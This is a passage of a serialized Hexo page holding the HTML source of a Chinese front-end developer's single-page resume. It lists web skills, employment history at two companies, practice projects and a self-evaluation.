glyphicon-tag\"></span>\n          职业技能\n        </h4>\n      </div>\n      <!-- 内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            具有三年 Web 开发经验，熟练掌握H5、C3，能够基于scss等拓展语言快速开发，构建出高性 能并且兼容性好的Web应用\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <span class=\"values\">\n            具有扎实的JS基础，并且熟练掌握ES6新语法\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            熟练掌握 Vue、Vue Router、Vuex等相关技术栈，能够根据业务需求封装特定组件\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            熟练掌握Hybird APP开发，对移动端适配和JS与原生交互有一定研究\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            掌握React、Redux，能够基于antd快速开发后台管理系统，有RN开发经验\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            熟练掌握Webpack、Babel和PostCSS，会配置常用的loader和plugin，能够快速构建工程\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            基本熟悉Node，会用Node编写提高工作效率的脚本，会使用Express进行接口开发\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            熟练掌握ESlint配置，并在项目中使用，统一编码规范\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\"> 熟练掌握Git和SVN等版本控制工具的使用</span>\n        </div>\n      </div>\n    </div>\n\n    <!-- 工作经历 -->\n    <div id=\"res-company\" class=\"res-company\">\n      <!-- 小标题 -->\n      <div class=\"row sub-title\">\n        <h4 class=\"col-xs-12 col-sm-3\">\n          <span class=\"glyphicon glyphicon-tag\"></span>\n          工作经历\n        </h4>\n      </div>\n      <!-- 公司名 及 工作岗位 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">2018.9-至今</span>\n          <span class=\"items\">中科软科技（web前端工程师）</span>\n        </div>\n      </div>\n      <!-- 岗位职责 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2019.6 – 至今</span>\n          <p class=\"values\">参与APP独立小应用的开发；</p>\n        </div>\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2019.3 – 2019.5</span>\n          <p class=\"values\">负责牙牙预约H5页面的开发工作，并配合后台完成系统升级；</p>\n        </div>\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2018.9 – 2019.2</span>\n          <p class=\"values\">负责Hybrid App 开发，负责预约功能、视频播放、大图预览等模块开发</p>\n        </div>\n      </div>\n      <br>\n      <!-- 公司名 及 工作岗位 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">2018.8 - 2017.7</span>\n          <span class=\"items\">北京橙悦科技有限公司（web前端工程师）</span>\n        </div>\n      </div>\n      <!-- 岗位职责 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2018.2 – 2018.8</span>\n          <p class=\"values\">参与摄影器材租赁系统后端管理平台开发工作；负责公司首页开发的开发工作，以及公众号的开发。 </p>\n        </div>\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2017.8 – 2018.1</span>\n          <p class=\"values\">负责公司首页开发的开发工作，以及公众号的开发。 </p>\n        </div>\n      </div>\n    </div>\n\n    <!-- 练手项目 -->\n    <div id=\"res-project\" class=\"res-company\">\n      <!-- 小标题 -->\n      <div class=\"row sub-title\">\n        <h4 class=\"col-xs-12 col-sm-3\">\n          <span class=\"glyphicon glyphicon-tag\"></span>\n          练手项目\n        </h4>\n      </div>\n      <!-- 111111111111111 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2020.2 – 至今&nbsp;&nbsp;&nbsp;Vue移动端的组件库-lightui </span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：一个轻量级的<a href=\"https://github.com/houfee/light-ui\" target=\"_blank\" rel=\"noopener\">vue移动端组件库</a>\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">1、 升级vue-cli2依赖包，包括babel、webpack以及其他loader</p>\n          <p class=\"values\">\n            2、 参考cube-ui的打包模式，依赖一套package，构建生成组件模块、\n            <a href=\"https://houfee.github.io/light-ui/example/#/\" target=\"_blank\" rel=\"noopener\">example</a>和\n            <a href=\"https://houfee.github.io/light-ui/#/zh-CN\" target=\"_blank\" rel=\"noopener\">文档网址</a>\n          </p>\n          <p class=\"values\">3、 参考element-ui的scss设计思想，并在项目中使用</p>\n          <p class=\"values\">4、 将现有的vue组件库的优秀组件添加到lightui中。</p>\n        </div>\n      </div>\n      <br>\n      <!-- 44444444444444 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2019.10 – 2020.1&nbsp;&nbsp;&nbsp;react后台管理项目</span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：后台管理项目，包括\n            <a href=\"http://49.235.41.140:8080/#/login\" target=\"_blank\" rel=\"noopener\">用户登录</a>、\n            <a href=\"http://49.235.41.140:8080/#/home\" target=\"_blank\" rel=\"noopener\">首页</a>、\n            <a href=\"http://49.235.41.140:8080/#/category\" target=\"_blank\" rel=\"noopener\">商品管理</a>、\n            <a href=\"http://49.235.41.140:8080/#/user\" target=\"_blank\" rel=\"noopener\">用户管理</a>以及\n            <a href=\"http://49.235.41.140:8080/#/charts/bar\" target=\"_blank\" rel=\"noopener\">图形图标</a>等模块\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">1、使用antd组件库搭建项目结构，完成该项目的用户管理，首页等多个模块的开发</p>\n          <p class=\"values\">2、通过jsonp方式请求第三方天气接口，为项目添加天气模块</p>\n          <p class=\"values\">3、使用echarts添加可视化图形模块，使用draftjs-to-html为项目添加富文本编辑器</p>\n          <p class=\"values\">4、使用redux进行状态管理</p>\n        </div>\n      </div>\n    </div>\n\n    <!-- 项目经验 -->\n    <div id=\"res-project\" class=\"res-company\">\n      <!-- 小标题 -->\n      <div class=\"row sub-title\">\n        <h4 class=\"col-xs-12 col-sm-3\">\n          <span class=\"glyphicon glyphicon-tag\"></span>\n          项目经验\n        </h4>\n      </div>\n      <!-- 111111111111111 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">APP小应用开发：2019.6 – 至今</span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：完成多个功能的小应用开发，包括预约、详情、评价、内容介绍等任务\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">\n            1、改造vue-cli，使用postcss相关插件完成移动端的适配\n          </p>\n          <p class=\"values\">\n            2、根据业务需求完成公共组件，包括日历选择组件，时间颗粒度选择组件，证件弹框组件等\n          </p>\n          <p class=\"values\">\n            3、通过 vue-router 的生命周期钩子判断不同入口的页面返回以及跳转，并且在该页面销毁时将数 据保存在vuex中\n          </p>\n          <p class=\"values\">\n            4、通过 js 和原生交互，实现原生向页面注数据，以及 js 调取原生的相机、地图、电话等组件，并 且实现页面埋点，统计访问数据\n          </p>\n          <p class=\"values\">5、配合产品完成页面功能改进，提升用户体检</p>\n        </div>\n      </div>\n      <br>\n      <!-- 44444444444444 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">牙牙预约：2019.3 - 2019.5</span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：牙牙预约为客户提供牙齿健康预约服务，进行Vue多页面开发，在不同平台有不同的样式风格，以及不同渠道的预约门店等不同\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">1、将老项目代码从SVN移植到GitLab；相似渠道代码归并，减少代码量</p>\n          <p class=\"values\">2、根据业务需求重构代码，便于用于新渠道开发</p>\n          <p class=\"values\">3、重写并替换项目冗余组件，便于项目维护和移植</p>\n          <p class=\"values\">4、调用高德、腾讯等地图组件，实现定位功能</p>\n          <p class=\"values\">5、配合后端同事完成数据优化以及实现新需求</p>\n        </div>\n      </div>\n      <br>\n      <!-- 2222222222222222222 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">富通App：2018.9 – 2019.2</span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：富通App是一款供保险代理人使用，向代理人提供竞赛、预约、宣传、业绩查询、消 息接收等功能\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">1、根据UI提供的设计稿转换为适配移动端的H5页面</p>\n          <p class=\"values\">2、通过webview实现js与原生交互，让内嵌H5可以调用客户端的原生方法</p>\n          <p class=\"values\">3、在APP中，通过videojs实现视频播放，以及使用echarts实现数据可视化</p>\n          <p class=\"values\">4、开发前端通用的按钮组件、弹框组件和日历组件</p>\n          <p class=\"values\">5、webpack打包优化，以及后期的性能优化等</p>\n        </div>\n      </div>\n      <br>\n      <!-- 33333333333 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">IPF摄影器材租赁系统：2018.1 – 2018.8</span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：IPF摄影器材租赁系统是一款后端管理平台，向用户租赁各种摄影器材，主要包括登录、商品管理、用户管理、订单管理等。\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">\n            1、负责web产品页面制作，根据产品需求，制定管理系统的UI风格，实现用户交互的效果；\n          </p>\n          <p class=\"values\">\n            2、持续优化前端体验和页面响应速度，提升web界面友好易用；\n          </p>\n          <p class=\"values\">\n            3、与产品经理、UI设计师及开发经理沟通，理解需求，进行敏捷开发、持续交付和验证；\n          </p>\n          <p class=\"values\">\n            4、完成一些推广的H5页面，如活动介绍，公司月报总结等；\n          </p>\n          <p class=\"values\">\n            5、帮助其他同事进行部分页面的调试，负责后期的性能优化。\n          </p>\n        </div>\n      </div>\n    </div>\n\n    <!-- 自我评价 -->\n    <div id=\"res-skill\" class=\"res-skill footer\">\n      <!-- 小标题 -->\n      <div class=\"row\">\n        <h4 class=\"col-xs-12 col-sm-3\">\n          <span class=\"glyphicon glyphicon-tag\"></span>\n          自我评价\n        </h4>\n      </div>\n      <!-- 内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 一、</span> -->\n          <span class=\"values\">\n            本人性格开朗，有良好的沟通能力和团队协作精神，具有良好的业务理解能力，能够独立解决工作中遇到的问题；\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 二、</span> -->\n          <span class=\"values\">\n            热爱编程，喜欢专研新技术，不断突破技术瓶颈，遇到问题一查到底，乐于记笔记、写博客；\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 三、</span> -->\n          <span class=\"values\">\n            喜欢前端，热爱互联网行业，关注前沿技术，能够保持不断学习的决心和动力。\n          </span>\n        </div>\n      </div>\n    </div>\n\n    <!-- <script src=\"assets/jquery/jquery.1.12.4.min.js\"></script>\n    <script src=\"assets/bootstrap/js/bootstrap.min.js\"></script> -->\n    <script src=\"https://cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js\"></script>\n    <script src=\"https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/js/bootstrap.min.js\"></script>\n    <!-- <script src=\"js/index.js\"></script> -->\n  </body>\n</html>\n","site":{"data":{}},"excerpt":"","more":"\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head><meta name=\"generator\" content=\"Hexo 3.8.0\">\n    <meta name=\"viewport\" content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\n    <meta name=\"keywords\" content=\"简历\">\n    <meta name=\"description\" content=\"单页简历\">\n    <meta name=\"author\" content=\"houfee\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <meta charset=\"UTF-8\">\n    <title>我的简历</title>\n    <!-- <link rel=\"stylesheet\" href=\"assets/bootstrap/css/bootstrap.css\"> -->\n    <!-- Bootstrap -->\n    <link href=\"https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css\" rel=\"stylesheet\">\n    <link rel=\"stylesheet\" href=\"fonts/iconfont/iconfont.css\">\n    <!-- [if lt IE 9]\n  <script src=\"assets/html5shiv/html5shiv.min.js\"></script>\n  <script src=\"assets/respond/respond.min.js\"></script>\n  [endif] -->\n    <!--[if lt IE 9]>\n      <script src=\"https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js\"></script>\n      <script src=\"https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js\"></script>\n    <![endif]-->\n    <link rel=\"stylesheet\" href=\"css/index.css\">\n  </head>\n\n  <body class=\"container\">\n    <!-- 导航栏 -->\n    <!-- <nav class=\"res-navbar\">\n    <div class=\"navbar-header\">\n      <button type=\"button\" class=\"navbar-toggle collapsed\" data-toggle=\"collapse\" data-target=\"#bs-example-navbar-collapse-1\">\n        <span class=\"icon-bar\"></span>\n        <span class=\"icon-bar\"></span>\n        <span class=\"icon-bar\"></span>\n      </button>\n      <span class=\"navbar-brand\">\n        <span class=\"iconfont icon-zhaopin\"></span>\n      </span>\n    </div>\n    <div class=\"collapse navbar-collapse\" id=\"bs-example-navbar-collapse-1\">\n      <ul class=\"nav navbar-nav\">\n        <li class=\"active\"><a href=\"#res-introduce\">个人介绍</a></li>\n        <li><a href=\"#res-skill\">技能展示</a></li>\n        <li><a href=\"#res-company\">工作经历</a></li>\n        <li><a href=\"#res-project\">项目经验</a></li>\n        <li><a href=\"#res-skill\">自我评价</a></li>\n      </ul>\n      <ul class=\"nav navbar-nav navbar-right hidden-sm\">\n        <li><a href=\"https://houfee.github.io/\">我的博客</a></li>\n      </ul>\n    </div>\n  </nav> -->\n\n    <!-- 个人介绍 -->\n    <div id=\"res-introduce\" class=\"res-introduce\">\n      <!-- 头像部分 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12 col-sm-3 avatar-box\">\n          <img class=\"my-avatar\" src=\"./images/timg.jpg\" alt=\"头像\">\n        </div>\n        <!-- 文字介绍部分 -->\n        <div class=\"col-xs-12 col-sm-9 my-info\">\n          <!-- 第一行 -->\n          <div class=\"row\">\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4 items\">姓名：</div>\n              <div class=\"col-xs-8 col-sm-8\">侯飞</div>\n            </div>\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4 items\">年龄：</div>\n              <div class=\"col-xs-8 col-sm-8\">25</div>\n            </div>\n          </div>\n          <!-- 第二行 -->\n          <div class=\"row\">\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">籍贯：</div>\n              <div class=\"col-xs-8 col-sm-8\">河北张家口</div>\n            </div>\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">学历：</div>\n              <div class=\"col-xs-8 col-sm-8\">本科</div>\n            </div>\n          </div>\n          <!-- 第三行 -->\n          <div class=\"row\">\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">毕业院校：</div>\n              <div class=\"col-xs-8 col-sm-8\">唐山学院</div>\n            </div>\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">毕业时间：</div>\n              <div class=\"col-xs-8 col-sm-8\">2017-07</div>\n            </div>\n          </div>\n          <!-- 第四行 -->\n          <div class=\"row\">\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">手机号：</div>\n              <div class=\"col-xs-8 col-sm-8\">13261351763</div>\n            </div>\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">邮箱：</div>\n              <div class=\"col-xs-8 col-sm-8\">allen1710@163.com</div>\n            </div>\n          </div>\n          <!-- 第五行 -->\n          <div class=\"row\">\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">工作经验:</div>\n              <div class=\"col-xs-8 col-sm-8\">3年</div>\n            </div>\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">应聘职位：</div>\n              <div class=\"col-xs-8 col-sm-8\">web前端工程师</div>\n            </div>\n          </div>\n        </div>\n      </div>\n    </div>\n\n    <!-- 技能展示 -->\n    <div id=\"res-skill\" class=\"res-skill\">\n      <!-- 小标题 -->\n      <div class=\"row\">\n        <h4 class=\"col-xs-12 col-sm-3\">\n          <span class=\"glyphicon glyphicon-tag\"></span>\n          职业技能\n        </h4>\n      </div>\n      <!-- 内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            具有三年 Web 开发经验，熟练掌握H5、C3，能够基于scss等拓展语言快速开发，构建出高性 能并且兼容性好的Web应用\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <span class=\"values\">\n            具有扎实的JS基础，并且熟练掌握ES6新语法\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            熟练掌握 Vue、Vue Router、Vuex等相关技术栈，能够根据业务需求封装特定组件\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            熟练掌握Hybird APP开发，对移动端适配和JS与原生交互有一定研究\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            掌握React、Redux，能够基于antd快速开发后台管理系统，有RN开发经验\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            熟练掌握Webpack、Babel和PostCSS，会配置常用的loader和plugin，能够快速构建工程\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            基本熟悉Node，会用Node编写提高工作效率的脚本，会使用Express进行接口开发\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            熟练掌握ESlint配置，并在项目中使用，统一编码规范\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\"> 熟练掌握Git和SVN等版本控制工具的使用</span>\n        </div>\n      </div>\n    </div>\n\n    <!-- 工作经历 -->\n    <div id=\"res-company\" class=\"res-company\">\n      <!-- 小标题 -->\n      <div class=\"row sub-title\">\n        <h4 class=\"col-xs-12 col-sm-3\">\n          <span class=\"glyphicon glyphicon-tag\"></span>\n          工作经历\n        </h4>\n      </div>\n      <!-- 公司名 及 工作岗位 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">2018.9-至今</span>\n          <span class=\"items\">中科软科技（web前端工程师）</span>\n        </div>\n      </div>\n      <!-- 岗位职责 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2019.6 – 至今</span>\n          <p class=\"values\">参与APP独立小应用的开发；</p>\n        </div>\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2019.3 – 2019.5</span>\n          <p class=\"values\">负责牙牙预约H5页面的开发工作，并配合后台完成系统升级；</p>\n        </div>\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2018.9 – 2019.2</span>\n          <p class=\"values\">负责Hybrid App 开发，负责预约功能、视频播放、大图预览等模块开发</p>\n        </div>\n      </div>\n      <br>\n      <!-- 公司名 及 工作岗位 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">2018.8 - 2017.7</span>\n          <span class=\"items\">北京橙悦科技有限公司（web前端工程师）</span>\n        </div>\n      </div>\n      <!-- 岗位职责 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2018.2 – 2018.8</span>\n          <p class=\"values\">参与摄影器材租赁系统后端管理平台开发工作；负责公司首页开发的开发工作，以及公众号的开发。 </p>\n        </div>\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2017.8 – 2018.1</span>\n          <p class=\"values\">负责公司首页开发的开发工作，以及公众号的开发。 </p>\n        </div>\n      </div>\n    </div>\n\n    <!-- 练手项目 -->\n    <div id=\"res-project\" class=\"res-company\">\n      <!-- 小标题 -->\n      <div class=\"row sub-title\">\n        <h4 class=\"col-xs-12 col-sm-3\">\n          <span class=\"glyphicon glyphicon-tag\"></span>\n          练手项目\n        </h4>\n      </div>\n      <!-- 111111111111111 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2020.2 – 至今&nbsp;&nbsp;&nbsp;Vue移动端的组件库-lightui </span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：一个轻量级的<a href=\"https://github.com/houfee/light-ui\" target=\"_blank\" rel=\"noopener\">vue移动端组件库</a>\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">1、 升级vue-cli2依赖包，包括babel、webpack以及其他loader</p>\n          <p class=\"values\">\n            2、 参考cube-ui的打包模式，依赖一套package，构建生成组件模块、\n            <a href=\"https://houfee.github.io/light-ui/example/#/\" target=\"_blank\" rel=\"noopener\">example</a>和\n            <a href=\"https://houfee.github.io/light-ui/#/zh-CN\" target=\"_blank\" rel=\"noopener\">文档网址</a>\n          </p>\n          <p class=\"values\">3、 参考element-ui的scss设计思想，并在项目中使用</p>\n          <p class=\"values\">4、 将现有的vue组件库的优秀组件添加到lightui中。</p>\n        </div>\n      </div>\n      <br>\n      <!-- 44444444444444 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2019.10 – 2020.1&nbsp;&nbsp;&nbsp;react后台管理项目</span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：后台管理项目，包括\n            <a href=\"http://49.235.41.140:8080/#/login\" target=\"_blank\" rel=\"noopener\">用户登录</a>、\n            <a href=\"http://49.235.41.140:8080/#/home\" target=\"_blank\" rel=\"noopener\">首页</a>、\n            <a href=\"http://49.235.41.140:8080/#/category\" target=\"_blank\" rel=\"noopener\">商品管理</a>、\n            <a href=\"http://49.235.41.140:8080/#/user\" target=\"_blank\" rel=\"noopener\">用户管理</a>以及\n            <a href=\"http://49.235.41.140:8080/#/charts/bar\" target=\"_blank\" rel=\"noopener\">图形图标</a>等模块\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">1、使用antd组件库搭建项目结构，完成该项目的用户管理，首页等多个模块的开发</p>\n          <p class=\"values\">2、通过jsonp方式请求第三方天气接口，为项目添加天气模块</p>\n          <p class=\"values\">3、使用echarts添加可视化图形模块，使用draftjs-to-html为项目添加富文本编辑器</p>\n          <p class=\"values\">4、使用redux进行状态管理</p>\n        </div>\n      </div>\n    </div>\n\n    <!-- 项目经验 -->\n    <div id=\"res-project\" class=\"res-company\">\n      <!-- 小标题 -->\n      <div class=\"row sub-title\">\n        <h4 class=\"col-xs-12 col-sm-3\">\n          <span class=\"glyphicon glyphicon-tag\"></span>\n          项目经验\n        </h4>\n      </div>\n      <!-- 111111111111111 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">APP小应用开发：2019.6 – 至今</span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            